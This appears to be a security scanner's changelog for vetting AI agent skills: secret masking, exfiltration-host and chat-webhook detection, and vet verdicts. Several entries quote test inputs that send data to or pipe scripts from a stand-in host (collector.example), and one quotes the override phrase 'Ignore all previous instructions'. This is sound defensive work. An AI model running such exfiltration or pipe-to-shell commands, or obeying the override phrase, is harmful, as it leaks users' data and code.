`test_d_a_cache_json_hardlinked_to_the_other_cache_is_not_bookkeeping` hardlinks two `.bucket-` markers; `test_d_a_cache_json_reached_through_a_linked_parent_folder_is_not_bookkeeping` lists the alias, expects both caches quiet, then a cache rewrite to be a counted high at both names. Known gaps: no cache field is normalized, so every sync that rewrites a cache (554 KB on Ken's box) is a counted high at both names until a release lists the new bytes; in a home folder linked into itself, a platform file named by its real path is in no platform folder as written, so `platform_listed` can't clear it under that name (as before).
- Hardening batch 4, row 11 (R11), secrets in stored evidence: shell-history evidence was masked only when it looked like a T011 key, so Bearer tokens, `export X=…` values, passwords, `user:pass@` URLs and `mysql -p…` ended up in `events.json` and `last_findings.json`, which every Bot can read. New `mask_secrets()` masks key shapes (the SCRUB and T011 prefixes with loose lengths, so a key cut at 160 is still caught; first 6 characters kept), `Authorization`/`Proxy-Authorization`/`X-Api-Key`/`Cookie` header values, `Bearer <tok>`, `NAME=value` when the name says token, secret, password, pass, api_key, access_key, private_key, auth, credential, session or cookie, `scheme://user:[hidden]@`, the value after `--password`/`--passwd`/`--pass`/`--token`/`--api-key`/`--secret`, a private key's body, and `-p<val>` only after mysql, mysqldump, mysqladmin, mariadb or sshpass (`mkdir -p` and `ssh -p 22` stay readable). `$VAR` and `${VAR}` references are never touched, and masking twice changes nothing. `finding()` is the one choke point: the key is still made from the raw evidence, so every key is byte-identical, and only the stored evidence is masked before it is cut to 160. History findings pass the whole line. Evidence an older version stored is masked once (never `key` or `key0`) when `events.json` is loaded and saved and when the snapshot is written, so the first daily or audit cleans both files. The incident pack's history tails, processes and jobs use the same masking. Replays in `tests/test_hardening_batch4.py`.
- Hardening batch 4, row 9 (FP1–3), the owner's own chat webhook was a critical "exfiltration host": Slack and Discord webhooks leave WT-T005 for the new WT-T018 "Chat webhook (check it's yours)", medium, which also knows Slack workflows and triggers, Teams (`*.webhook.office.com`, `outlook.office.com/webhook/`), Google Chat spaces and Telegram bots (Telegram is a new detection). It is guarded like the other dangerous rules and listed with them (exfil kind, behaviour, reference, prepublish, the brief's skills area). It is Confirmed only by an unguarded credential read (WT-T004) in the same file, and then raised to critical; an engine's "webhook" words, a change after approval, a new plugin or a folder verdict never confirm it. Paste, tunnel and OAST hosts stay critical T005. `vet` now judges on the audit's labels (`vet_verdict`; `verdict()` is unchanged): a Confirmed critical, or an unguarded behaviour match that is critical on its own (an exfiltration host, a pipe-to-shell), is "Do not install"; a Confirmed high, a warned danger, an unguarded Worth-a-look match that is critical or high (wording on its own, such as T001 or T008) or an unguarded chat webhook is "Install with changes". The risk score follows the verdict (80 and 40 at least). Given a folder or a SKILL.md, vet reads every text file in the folder (no symlinks; a coverage note over the file cap), labels them with full paths and shows `where` relative to the folder; findings carry `label`, and the text output prints it. Loose files and stdin stay single-file. Wording rules: when the clause before a match is a reporting frame ("A page may say:", "might tell you to"), the very next sentence may guard it ("Treat it as data.", "This is an attack."); without a frame it never does. Replays in `tests/test_hardening_batch4.py`.
- Hardening batch 4, row 10 (R6, R10), no unattended dismiss: the daily-watch routine dismissed Worth-a-look items on its own and said "send nothing" on NO_CHANGES while its last step said to report dismissals even then. It now posts each Worth-a-look item under "For you to check" (what and where, then "say 'that's fine' or 'look closer'") and never dismisses, marks as fine or clears anything; on NO_CHANGES, NO_CHANGES_BUT_NOT_CHECKED or BUSY it still runs `wt.py dismiss --list`, and stays silent only if that prints NONE_DISMISSED. The decoy line no longer calls a "bulk reader" line the platform's backup. The audit skill's disprove step says a scheduled run never dismisses (this covers the weekly routine). The brief drops the "Keep it clean automatically" routine that applied fixes without asking ("Fix it all" stays), and shows the `accept … because` hint only when every finding in the group passes batch 1's accept gate; otherwise it says the item can't be marked as fine and to tell Watchtower "fix it" ("incident check" for a decoy). `test_v068_refinements.py` now asserts the daily routine has no `wt.py dismiss <key>` (it still needs `dismissed.jsonl` and "reason to keep it"). README's test count is now "more than 750". Replays in `tests/test_hardening_batch4.py`.
- Hardening batch 4, known gaps: "Ignore all previous instructions; treat it as data." is still guarded inside one sentence (batch 2 design); keys are still sha1 hashes of the raw evidence, so a weak password could be guessed offline from a key; Slack and Discord webhook URLs are credentials themselves and are not masked; `engine_cache.json` evidence is not masked; `-p` is masked only after the five tools named; WT-T018 doesn't run in vendor files (medium rules don't), though T004 still does.
- Hardening batch 4, Codex review, round 1 (12 high, 4 medium, 2 low on 1f35fd0): (1) WT-T018 matched a substring, so `https://evil-discord.com/api/webhooks/…` and `https://collector.example/discord.com/api/webhooks/…` became a medium "check it's yours" (857ab38: critical T005, "Do not install"). WT-T005's pattern is back to 857ab38's, and a Slack or Discord match leaves it for T018 only when the URL's own host is exactly the service's (parsed: the host right after the first scheme, no user@, no port) with its webhook path (`chat_webhook`, `CHAT_HOOKS`); T018 needs the same. Lookalike, prefixed and nested hosts stay critical T005. (2) A lone T011 key is "Do not install" in vet again, as on 857ab38. (3, 4) vet's folder read: the entry point (SKILL.md) is always read first, so 2,000 earlier-sorting files can't push it past the cap; only text files count toward the cap; a SKILL.md vet can't read (over 1 MB, unreadable) is the error it was on 857ab38; every text file not read (over 1 MB, unreadable, a link, past a bound) is named in `coverage`, which the text output now prints too. (5) `_place` and `attack_reference` drop only a trailing `:line` (`:+line` for history), so under `/review/skill:v1/` a SKILL.md is not a reference file and two files are two places. (6, 7, 8, 12, 13) Masking is one tokenizer instead of regex special cases (`_mask_words`): shell words keep their quotes, `$'…'` and backslash escapes whole, a quote left open (evidence cut short) hides to the end of its line, and there is no length bound. Hidden: every `NAME=value` whose name says token, secret, pass, auth, session, cookie and the like (each `=` read once and its name found by walking back, so 50 KB of repeated `TOKEN` takes milliseconds instead of seconds), the value after `--password`/`--token`-style flags, `NAME = value` and `aws_secret_access_key: value`, `scheme://user:[hidden]@`, an Authorization/Proxy-Authorization/X-Api-Key/X-Auth-Token/Cookie/Set-Cookie header's whole value (its scheme word stays; Digest fields and quoted cookie values included; unquoted, it runs to the end of the command, a cookie's `;` included), the word after `Bearer` whatever its length (lower-case "bearer" needs 8 characters, so "the bearer token" stays), every `-p<password>` after mysql, mysqldump, mysqladmin, mariadb, mariadb-dump, mysqlimport, mysqlcheck or mysqlshow, and sshpass's `-p`. Only a complete `$VAR`/`${VAR}` reference or `[hidden]` is left alone (a leading `-` or `$`, or an ellipsis, no longer is). (9) A private key's body is masked before anything shortens its header, across lines, and after `-----B…----` (the header as older versions stored it); `finding(…, shown=)` stores the masked uncut text while the key is still made from what 857ab38 hashed, so history evidence is masked from the raw line, and the `ev[:140]` callers (T006k, reference lines, prepublish) mask the uncut match. (10) Approved skill copies store masked text next to the raw files' hashes, and skill diffs compare both sides masked ("changed inside a hidden value" when only a secret changed); older copies are masked once by the next audit or daily (`mask_approved_copies`, then `state/approved_masked`). `persistence.json` keeps the crontab masked plus `crontab_sha256`, which the next run compares (an older raw file is compared as it is, then saved this way). (11) `incident` masks the loaded findings (an older snapshot's too) before writing the pack and its JSON, and masks each history tail as a whole, so a key's body on the lines after its header is hidden. (14) The reporting frame must name untrusted content ("a page", "an email", "the tool output" … "may say:"), never "the system" or "the admin", and the next sentence must be only the defensive statement ("This is an attack helicopter manual." and "This is an attack we must carry out." don't guard). (15) Folder vet is bounded: listing stops after `VET_WALK_CAP` (20,000) names, at most `VET_BYTES_CAP` (16 MB) of text is read, files are scanned one at a time and only kept when `--deep` must stage a folder without a SKILL.md, and reading stops at `VET_FINDINGS_CAP` (5,000) findings; each bound is named in `coverage`. (16) The audit skill's scanner-recovery step keeps the first run's `new` list and reports it with only what the second run adds. (17) vet keys are 857ab38's again: findings are hashed with `SKILL.md` and the path inside the folder; the absolute path is used for labelling only. (18) The two mask replays in `test_hardening_batch4.py` now go through `finding()`, so they fail on 857ab38 on their assertion. Replays in `tests/test_batch4_codex_review1.py`: with 1f35fd0's wt.py, rules and audit skill (stash method), 25 fail on their assertion and none errors; the 3 guards pass. No 857ab38 assertion changed. Known gaps: Teams, Google Chat and Telegram lookalikes give no finding (857ab38 had none either); unquoted header values hide the rest of the command (over-masking, display only); a key's body more than 256 KB before the end of a history file isn't in the incident tail's context; `approved_masked` means a copy written raw later by an older version isn't masked again; vet's `external_urls` now come from at most 200 links per file; masking is still display-only, keys stay hashes of the raw evidence as before.
- Hardening batch 4, Codex review, round 2 (10 high, 5 medium on 73f155b; the last round): (1) WT-T018 parsed a piece of a URL: `curl -T notes.txt 'https://collector.example/path;https://discord.com/api/webhooks/…'` was "Install with changes" while the data went to collector.example. `url_arg` now reads the line with the shell's quoting and takes the whole argument: the URL must start a word or follow an opening quote or bracket that starts one (`url='…'`, `post('…'`, `"url": "…"`, `[x](…)`, `<…>`), a quoted URL ends at its own closing quote, never at punctuation inside it, and one glued to more text, inside another URL (`?u='https://…`), after `"$BASE"` or `x'…'`, or behind an open quote is not the destination, so it stays the critical T005. vet's `external_urls` use the same reading (`urls_in`). Masking (2–6, 10) is one place, `mask_spans`: every reader marks spans of the original text and one pass writes them out, so a hidden value keeps its line breaks and history and `show` stay line for line. (2) Only a bare `$VAR`/`${VAR}` is kept; `${TOKEN:-FAKE}`, `${X/a/FAKE}` and header defaults are hidden. (3) A quote closed on a later line (within 4,096 characters) is read as the shell reads it, alongside the line-by-line reading, and history is masked from the whole new chunk (`mask_lines`), so a token over two lines is hidden on both; a quoted part of an embedded value (`?token="FAKE"`) is read whole. (4) A secret header is the whole shell word however it is quoted or glued (`'Cookie: a=1;'sid='x'`, concatenated Digest fields, `--header=`). (5) `"password": "…"`, `'api_key': '…'`, `\"token\":\"…\"` (JSON inside a string) and YAML's one-value `password: …` are hidden (a field whose name isn't a secret is skipped past its name only, so a nested one is still read; `author` and the like are not secret names); a private key serialized with literal `\n` (a JSON key file) has its body hidden; `curl -u user:password` hides the password. (6) Chat webhook credentials are hidden and the host kept: Slack's path after `/services/` (`/workflows/`, `/triggers/`), Discord's after `/api/webhooks/` (on any host), Teams' after its first segment, Outlook's after `/webhook/`, Telegram's bot token, and Google Chat's `key`/`token`; a URL's `key`, `sig`, `signature`, `code`, `pwd` and X-Amz/X-Goog signature query values too. (10) `_assignments` finds where a word starts once instead of copying the text before each `=`; quoted parts with a single word inside aren't read twice, only lines with a secret word, `-p`, `-u`, Bearer, sshpass or a MySQL tool are tokenized (every rule needs one), the multi-line reading runs only where a quote crosses a line, and the key-shape scan skips by first letter: Codex's 800 KB case takes about 0.06 s (73f155b: 1.1 s), and `finding()` masks at most `MASK_WINDOW` (8,192) characters of what it stores 160 of. `MASK_VERSION` (2) marks what was masked: approved copies carry it and `state/approved_masked` holds it, so a copy marked by round 1 is masked again (Codex's JSON passwords). (7) `show` masks the whole file before cutting the context and masks evidence loaded from an older snapshot. (8) vet's `external_urls` are masked in both outputs. (9) `engine_cache.json` keeps SkillSpector's summaries and husk's messages masked (`engine_entry_masked`); which husk messages count, the kinds they name and the X001/X002/X003 keys for the folder are worked out from the raw words first and kept beside them, so classification and keys are 857ab38's; older cache entries are migrated by the next run; scanner notes in `last_findings.json` are masked too. (11) vet's findings cap holds inside a file (`scan_text(…, limit=, cut=)`: after the cap each rule still gets its first match and at most `limit` matches per rule are looked at; what was left out is named in `coverage`, a loose file included), listing counts names as they are listed (one huge folder stops at the cap instead of being read and sorted first), and labelling reads each distinct finding once (`_corrob_sig`: 5,000 findings in one file label in under 2 s; 73f155b took 41 s). (12) `_place` drops exactly one `:line` (or `:+line`), and none from a folder verdict or a whole-file fact (engines, WT-X/I/D/K, S003–S005, …), so `/fake/script:1:1` (line 1 of `script:1`) and `/fake/script:1` are two places and a webhook in one plus a credential read in the other is not Confirmed critical. (13) A linked folder (never followed) and a folder that can't be listed are named in `coverage`. (14) `audit` writes its complete delta (every new and fixed finding, masked) to a file of its own (`state/deltas/`, newest 20 kept) before anything is cut, and says `new_total`, `fixed_total`, `delta_file`, and `truncated` counted from the full lists; the audit skill's recovery step reads the first run's file when its `new` was cut and names every critical and high finding of it. (15) WT-T018 runs in vendor files, so a real chat webhook there is reported (T005 no longer is for it). Replays in `tests/test_batch4_codex_review2.py`: with 73f155b's wt.py and audit skill (stash method), 25 fail on their assertion and none errors; the 3 guards pass. No 857ab38 assertion changed. Known gaps: a value over several lines longer than 4,096 characters is hidden on its first line only (private keys excepted, their bodies are always found); a YAML value with spaces (`password: two words`) and a secret next to no secret-like name, flag, header or key shape stay readable; a hidden quoted value can take its closing quote with it (display only); a cache entry copied from another folder with the same files keeps its keys only if no masking changed its words; masking dense text (a secret word every few characters) is linear but can take up to about 1 s per 800 KB; prose apostrophes before a chat URL on the same line ("the users' hook https://discord…") leave it the critical T005.
- Hardening batch 4, Codex review, round 3 (the 8 remaining highs on ef0c241/d6f227e; the final round): (1) a chat URL that is one piece of a string expression was WT-T018: Python joins `'https://collector.example/' 'https://discord.com/api/webhooks/…'` (also across lines) and the data goes to collector.example, but vet said "Install with changes". `chat_webhook` now also asks `_standalone`: the URL must be the whole literal or argument. Another literal next to it, a `+` or `%` before or after it, a `.method` after a quoted one, a join/format/format_map/urljoin/reduce/sum/reversed call whose arguments it opens, or, when it follows a `,` or `:`, such a call or a `%` with a bracket earlier in the same block, keep the critical T005 (`base + '…'`, `''.join([base, '…'])`, `'{}{}'.format(base, '…')`, `'%s%s' % (base, '…')`, `% {'a': '…'}`, `urljoin('…', 'https://collector…')`, JS backtick `+`). `post('…')`, `request('POST', '…')`, `url = '…'`, JSON `"webhook": "…"`, a `curl … \` continuation and `[x](…)` stay T018. (2) vet's findings cap dropped matches it never looked at: 5,001 `curl https://sh.rustup.rs | sh` lines hid a later `curl https://collector.example/install.sh | sh` ("Install"; 857ab38: "Do not install"), chat URLs hid a later exfiltration host, and once the cap was reached the folder's remaining files were not read at all. The cap now limits what is kept, never what is read: every match is still read, and past the cap a file keeps a match only when it is a kind it hasn't kept yet (rule after the installer check, warning text or not), so the dangerous match and the labels come out as with all of them; every file is read whatever the cap. Reading has its own budget (`VET_MATCH_CAP`, 200,000 matches of one rule in one file). When anything of the skill's own wasn't read (that budget, a file over 1 MB or past the 16 MB total, an unreadable file, a folder that can't be listed, listing stopped, the file cap), vet never says "Install" or "Install with changes": the verdict is "Could not finish checking" (exit 1, risk at least 50), with `coverage` saying what; "Do not install" stays. A link (never followed) is not the skill's own and doesn't count. The vet-template skill and README say what the new verdict means. (3) A backslash at the end of a line joins the next one in the shell's reading (`API_TOKEN=\` then `FAKE…` on the next line, `--token \` then the value), and `NAME='…'`, `NAME="…"`, `NAME=$'…'` for a secret name are read to their closing quote however far away (`_quoted_values`, linear; one never closed is hidden to the end of the text), so a value longer than 4,096 characters or over many lines is hidden whole. (4) A YAML value is read whole (`_yaml_value`): words with spaces up to a ` #` comment, and a `|`/`>` block or any line indented under the key; serialized JSON is read escape by escape, so `\"password\":\"a\\\"b\"` hides `b` too. `MASK_VERSION` is 3, so approved copies and engine-cache entries masked by round 2 are masked again. (5) A URL is also read as the shell reads its word, with JSON's escaped slashes as slashes (`_word_urls`), and what is found is mapped back to the original characters: `'https://hooks.slack.com/services/T0/B0/'FAKE`, `'…/services/'"T0/B0/FAKE"` and `https:\/\/hooks.slack.com\/services\/…` (once or twice serialized) are hidden, host kept. (6) `--user=user:password` and `--proxy-user=…` (quoted or not) hide the password. (7) Resolved findings come from the last snapshot, possibly an older version's unmasked one: they are masked before the audit returns them (audit and daily JSON, `resolved.json` keys unchanged), and every delta record is masked as `save_delta` writes it. (8) Scanner diagnostics are masked where they are made and shown: `fail_note` (a scanner's error line, in every stage), a stage's FAILED line, and deep vet's `engines.notes`. Replays in `tests/test_batch4_codex_review3.py`: with d6f227e's wt.py, README and vet skill (stash method), 17 fail on their assertion and none errors; the 5 guards pass. Finding keys are 857ab38's; no 857ab38 assertion changed. Known gaps: the five mediums of review 3 are not fixed (a masked cache entry reused for an identical skill in another folder keeps the other folder's keys; `url_arg` re-slices for every escaped quote, quadratic on `a\"` runs; labelling distinct-file findings still compares each with every representative; a delta file that can't be written is silent; "the users' hook https://discord…" is still the critical T005). T018 errs toward T005: a chat URL literal right after another quoted word (shell `curl -d '{}' 'https://hooks…'`), followed by `+`, or after a `,`/`:` in a block with a join/format call or a `%(`, is reported as T005 (fails loud); a chat URL put in a variable and joined elsewhere (`u = '…'` then `post(base + u)`) is still T018. Masking over-hides by design: an unclosed `NAME='` hides the rest of the text, and a line starting with a secret-named key (`Authentication: …`) hides the rest of the line and the lines indented under it (display only; keys and detection read the raw text). Not read: triple-serialized JSON, `/`-escaped slashes, a webhook host split by quotes (`'https://hooks.slack'.com/…`). Reading every match makes a worst-case vet slower: about 1.8 s per 1 MB file of installer lines, so up to about 30 s at the 16 MB total. A deep-vet scanner that fails is named in `engines.notes` but doesn't change the verdict (Watchtower's own rules still read everything). Merged with item 8 (dev at c659708): 945 tests, so README says "more than 900".
- wt.py split into watchtower/wt_parts (no behavior change; D1/D2/D3): 24 slices of the old wt.py, each run by `_wt_part` inside wt.py's own namespace in the original order, compiled from its source bytes (no bytecode cache, no `sys.path`), listed in MANIFEST.sha256 and held by the self-check. wt.py keeps the header, the loader, the commands tests pin by source, the self-check and `main`. D2: doctor's `last_error.where` also keeps frames from a part (`wt_parts/engines.py line 5 in engine_findings`). D3: a part that is missing, a link or not a plain file stops the run with one SELF-CHECK FAILED line, exit 4. Guards in `tests/test_split_guard.py`; the golden check (`scripts/golden-check.sh 9b106b9`, the baseline ref now required) compares the split with the commit before it. (Codex round 1: golden harness fails loudly without the sandbox, on an empty selection, and without a baseline ref; tests in `tests/test_golden_harness.py`; README's test count now "more than 950")
- Batch 5, item 0, a golden check for changes made on purpose: the split's check could only prove "no change" (step 0 needed the reassembled wt.py to equal PRE_REF's, and every item had to be identical). `scripts/golden-check.sh PRE_REF [quick|full] [ONLY] --expect FILE --items A,B` is expect mode: step 0 checks that the reassembled wt.py compiles and that PRE_REF has the loader block; calibration and N1-N9 are unchanged; every line by which a post item differs from pre must match an entry of an enabled item in FILE (`tests/golden_expect/batch5.json`: item, scenario_rx, key_rx, lines_rx, must_see, why; an item only one side has is a `+<new item>`/`-<item gone>` line), a must_see entry that matched nothing in a run where its scenarios ran is a problem, and the report counts the lines each item matched. A line pattern that accepts any added or any removed line (`.*`, `.+`, `^[-+]`, empty) is refused. Without `--expect` the check is exactly the split check. `tests/test_golden_expect.py` (stubs, no sandbox): an unlisted line fails, a listed one passes and is counted, a listed line in another item or scenario fails, an unmet must_see fails, a must_see whose scenario didn't run doesn't, a disabled item's entries are ignored, the byte step still runs without `--expect`, broad patterns and malformed entries are refused, the script passes the options on; test_golden_harness (H1-H3) unchanged. Run on 151e40c with no item enabled: no difference.
- Batch 5, Codex review 4, high (c1) and medium, a chat URL inside a bigger expression: `_standalone` looked at one character on each side, so `requests.post('https://collector.example/' + ('https://discord.com/api/webhooks/…'), …)`, `('…') + path`, `base + (\n '…')`, `base + str('…')`, `base + [('…')][0]`, a `# comment` between two literals (after the first, or on its own line in a multi-line call) and JS `'…' + /* x */ '…'` were WT-T018 "Install with changes" (151e40c) while the data went to collector.example; and a quoted shell argument after another (`curl --header 'Content-Type: application/json' '…'`, with a `\` continuation too, and `curl -d '{}' '…'`, the known gap of round 3) was the critical T005. A shell line (an sh/bash/shell/console block, or a logical line or `inline code` starting with curl, wget, http, https or xh after `$ `, sudo and VAR=value words) is now read as shell words (`_logical_words`): the URL is the whole value when its word is exactly the quoted URL. Anything else quoted is read as code: a tokenizer (Python/JS strings, triple quotes, backticks, `#`, `//` and `/* */` comments, brackets; each fenced block or code file read once per text) climbs from the literal through groups, wrapper calls and the collections it is in, up to a sender call (post, request, fetch, axios, urlopen, Request, get, put, send), an assignment, a keyword argument, a dict value or the statement start; a literal, `+`, `%` or `*` beside it, a join/format/urljoin/concat call, an f-string, an index or attribute after it, an unclosed bracket, string or comment keep T005. Markdown prose is read line by line, with backticks as inline code. Wording unchanged. Replays (`tests/test_batch4_codex_review4.py`, `EnclosingExpression`): the 8 code shapes (151e40c: T018 each, measured one by one), the 3 shell lines (151e40c: T005 each), and `(('…', base)[0])`, an unclosed `/*` and `wrap((…)).strip() + x` (151e40c: T018 each). Guards: review 3's ten expressions stay T005 and its seven standalone forms T018, review 1 `ChatHostExact` and review 2 `WholeUrlArgument` run unmodified, glued shell words and f-strings stay T005, 8× the text costs under 16× the time, and 10,000 unclosed brackets give T005 in under 0.5 s. No tierA vet output changed (golden).
- Batch 5, Codex review 4, high (c2), a credential's whole shell word: only `NAME='…'` had an uncapped reader, and it stopped at that quoted segment, so a quoted value over many lines (past the 4,096 characters a crossing quote was read for) kept its later lines in `--user='…'`/`"…"`, `--proxy-user=`, `-u '…'`, `--token '…'`, `-H 'Authorization: …'`, `-d 'token=…'`, `export "API_TOKEN=…"`, `'API_TOKEN'='…'` and Codex's `API_TOKEN='prefix'"FAKEfirst…FAKElast"`. `_credential_word_spans` reads each shell word of the whole text once (`_logical_words`: quotes, `$'…'`, escapes, glued segments and line joins; an unclosed quote runs to the end) and, for a word that crosses a line or is longer than 4,096 characters, hides from after the `=` (a secret NAME, --token=…), after the first `:` (--user=, -u/--user/--proxy-user's next word), the whole next word after a secret flag, after a credential header's name and scheme, or from a secret name's `=` in a -d/--data word, to the word's end. Single-line words are masked exactly as on 151e40c (12 recorded inputs, byte-equal). Replays: the Codex line through history (151e40c kept FAKElast in events.json and last_findings.json), the ten forms through `mask_secrets`, finding evidence and an approved copy (151e40c kept FAKEz in each), an unclosed quote over a megabyte (151e40c kept every line after the first). A quoted key at a line's start (after indentation and an optional `- `) followed by `: ` or the line's end now has its YAML value read whole (`_yaml_quoted_keys`, `_yaml_value`); a quoted value, a `{`/`[` value and a single word alone on its line (`"token_count": 5,`) keep the JSON reading. Guards: JSON `{"password": "FAKE", "user": "ken"}` hides only FAKE, non-secret keys stay, review 3's YAML tests run unmodified. `MASK_VERSION` 3 → 4 once for c2, c3 and c4: approved copies and engine-cache entries are masked again (golden: only `"masked": 4` and the `4 …` marker differ in every box; no copy's text changed there).
- Batch 5, Codex review 4, high (c4), webhook URLs over line joins and JSON escapes: `_word_urls` read one physical line, so `https://hooks.slack.com/services/T0/B0/\` + a line break + the credential (unquoted, `"…"` or `'…'\`), a host and path split by a join, and JSON `/` escapes kept the credential. It now reads the URL's logical shell word (`_logical_words`, resuming after the last word read, so many URLs on one line stay linear), drops joins, unquotes, reads `\/` and `\uXXXX` (surrogate pairs combined) and maps what it hides back over every escape. - Batch 6 PR2, B5 (DQ-043/044), example keys were secrets: FAKE keys and fake key blocks in a live skill's `examples/` were a critical "gitleaks: secrets in 4 files under examples" with "Keys left in files … Watchtower clears the copies", a CI log's `${{ secrets.X }}` was a key and on the scrub list, and every `-----BEGIN … PRIVATE KEY-----` line was a critical WT-T011 whatever followed. One content check, `secret_kind` (text.py), now judges the secret value only (never its line or its file's name) for WT-T011, WT-S001, `codescan` and every gitleaks hit: FAKE/placeholder text and low variety (`looks_real_secret`), a bare environment-variable reference (`$X`, `${X}`, `${{ secrets.X }}`, `%X%`, `process.env.X`, `***`), a key block judged by its structure alone (`pem_kind`: read to its END line, at most 16 KB, headers out, the body must decode to 32 bytes and be a DER SEQUENCE spanning it with an INTEGER first for PKCS#1/#8/SEC1, a SEQUENCE for encrypted PKCS#8, `openssh-key-v1` for OpenSSH, a secret-key packet for PGP, a multiple of 8 bytes for an old `Proc-Type: 4,ENCRYPTED` body; any other label is real once it decodes; no END is real; a FAKE word inside decides nothing), and a gitleaks generic-api-key whose value is a 40/64/128-hex digest named by a file name are examples. gitleaks keeps `--redact`: each hit's secret is found again in lines StartLine..EndLine of the file as Watchtower reads it (`gitleaks_secret`: Match turned into a pattern, REDACTED as the secret), judged in memory and dropped; unless exactly one place fits and, when gitleaks gives it, the secret has gitleaks' Entropy, the hit is kept as before (a file changed since gitleaks read it, or an example value swapped in, is never judged). Example hits are left out before the per-file and folder grouping and counted in one note ("gitleaks: N hit(s) were example values (FAKE or placeholder text, an environment variable name, a key block that isn't a real key, or a file's checksum), not listed."). Ken: no name-based skips, so gitleaks' `tests/`, `fixtures/`, `testdata/` and `*.test.*`/`*.spec.*` path skips and the line rule that hid a whole line next to "token" and a `$VAR`, `<…>`, `xxxx`, `***` or `...` (so `token=$X api_key=<a real key>` was hidden) are gone, and so is `fixplan.py`'s FIXTURE_PATH (a key in tests, docs, examples or a `.md` lowered to low by its name). `.pem` is in TEXT_EXT, so a key file is read on a rules-only install; `.key` stays out. Replays (`tests/test_batch6_example_keys.py`, 9, each failing on 5dcd0a2 at its assertion; the gitleaks there is a stand-in that reports named hits and applies Watchtower's config allowlists as gitleaks does): FAKE `ghp_`, `sk_live_`, `AKIA` and a placeholder in a live skill's `examples/` (no finding, no critical, the note), fake key blocks (no T011, no S002), a CI log's environment references (no S002, not on the scrub list), a checksum list, five fakes and one real key in one folder (only the real file, not a group), a generated real key in `tests/`, under `fixtures/`, in `*.test.ts` and `__tests__/` (5dcd0a2: hidden by the path skips), a generated key in a `.pem` file (5dcd0a2 never read it), a real key on the line of a `$VAR` (5dcd0a2: the line rule hid it). Guards (real-shaped keys generated at test time, never committed): generated PKCS#1, PKCS#8, OpenSSH, encrypted PKCS#8 and old encrypted PEM blocks in a live skill are critical; FAKE inside a generated DER body is still a key; a fake key block's BEGIN line on the line of a generated `api_key=` value doesn't hide it (only gitleaks' private-key hit is read as a key block); a hit whose file changed after gitleaks, or whose value was swapped for an example, is kept; no secret value anywhere under Watchtower's folder (state, last findings, ledger, reports, approved copies); a FAKE `AKIA` stays dropped and a real one found. Changed assertion (plan section 3, Ken's decision): `test_watchtower.py::Features::test_trufflehog_is_the_authority_on_keys`, `helper.test.ts:1` `low` → `medium` (its name no longer lowers it).
- Batch 6 PR2, B6 (DQ-045), a dismissed finding came back after an unrelated edit: dismissing a Worth-a-look WT-T006k and then adding a line elsewhere in the skill brought it back Confirmed and new in the daily, because the edit's WT-I001 backed it up. Ken's decision: a dismissal (`state/dismissed.jsonl`, which a Bot can write) now holds for a finding that only the change backs up (`drift_only_keys`: `corroborated(…, ignore_drift=True)` is False, read before grouping) while its text is the one dismissed: its key, and `ev256` (the sha256 of its whole evidence, a digest, kept by `finding()` only where the 160-character key doesn't cover it, and stored by `dismiss`), never when it is critical (`held_dismissal`). WT-I001 is still reported and counted; editing the dismissed text, any other backer, a planted record with another digest, or a critical finding brings it back; an evidence finding is never dismissed; only the audit's own `active()` call holds dismissals this way, so the fix's re-approval never reads one. Known limit kept: lines inserted above the match shift its `where`, so its key changes and it comes back once. Replays (`tests/test_batch6_dismiss_holds.py`, 5, each failing on 5dcd0a2 at its assertion): the daily's `new` is only "WT-I001 Reviewed skill or plugin changed" and T006k stays dismissed (5dcd0a2: back, Confirmed), the same in the audit, a long line dismissed by the owner holds and its record carries `ev256`, a record written before ev256 holds where the key covers the evidence, a dismissed T004 stays dismissed after an unrelated edit. Guards: an edited line, a T017 send backing a dismissed T004, a planted wrong digest, a critical T006 and an evidence I001 all come back or stay; `active()` without the audit's keys never sets a backed-up finding aside.
